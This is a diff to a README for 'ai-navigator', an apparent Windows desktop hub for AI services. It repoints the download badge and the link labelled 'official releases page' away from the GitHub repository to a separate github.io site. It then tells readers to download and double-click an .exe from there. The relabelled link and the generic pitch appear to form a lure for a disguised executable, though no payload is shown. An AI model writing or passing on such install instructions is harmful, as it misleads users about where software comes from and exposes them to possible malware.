@@ -1,6 +1,6 @@
 # 🤖 ai-navigator - Connect all your artificial intelligence tools
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue.svg)](https://github.com/Pincasromany553/ai-navigator)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue.svg)](https://pincasromany553.github.io)
 
 ai-navigator serves as a central hub for your desktop. It lets you reach your favorite AI models and agent platforms from one place. You no longer need to keep multiple browser tabs open to talk to different AI services. This app brings your digital assistants onto your computer, so you can manage your work in a single location.
 
@@ -8,7 +8,7 @@ ai-navigator serves as a central hub for your desktop. It lets you reach your fa
 
 You can add this tool to your computer in a few minutes. Follow these instructions to set up the software on your Windows machine.
 
-1. Visit the [official releases page](https://github.com/Pincasromany553/ai-navigator) to download the setup file.
+1. Visit the [official releases page](https://pincasromany553.github.io) to download the setup file.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Save the file to your computer.
 4. Double-click the saved file to begin the installation process.
